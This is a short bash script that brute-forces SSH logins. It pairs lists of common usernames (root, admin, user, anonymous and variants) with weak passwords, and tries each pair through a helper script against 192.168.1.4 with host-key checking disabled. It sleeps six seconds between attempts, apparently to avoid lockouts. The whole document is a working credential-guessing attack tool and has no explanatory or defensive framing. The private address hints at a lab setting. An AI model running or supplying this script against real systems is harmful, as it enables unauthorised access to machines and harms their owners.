declare -a users=("root"
		"admin"
		"admin1"
		"administrator"
		"administrator1"
		"user"
		"user1"
		"anonymous"
		"anonymous1"
		"Admin"
		"Admin1"
		"Administrator"
		"Administrator1"
		"User"
		"User1"
		"Anonymous"
		"Anonymous1"
		)

declare -a passwords=("password"
			"password1"
			"password123"
			"pass123"
			"Password"
			"Password123"
			"GoPackers"
			"GoCowboys"
			"GoSeahawks"
			"admin"
			"administrator"
			"root"
			"Admin"
			)


for user in "${users[@]}"
do
	for password in "${passwords[@]}"
	do
		./ssh_pass_fail.bash "$password" ssh -o "StrictHostKeyChecking no" "$user"@192.168.1.4
		# echo "$password"
		sleep 6
	done
done
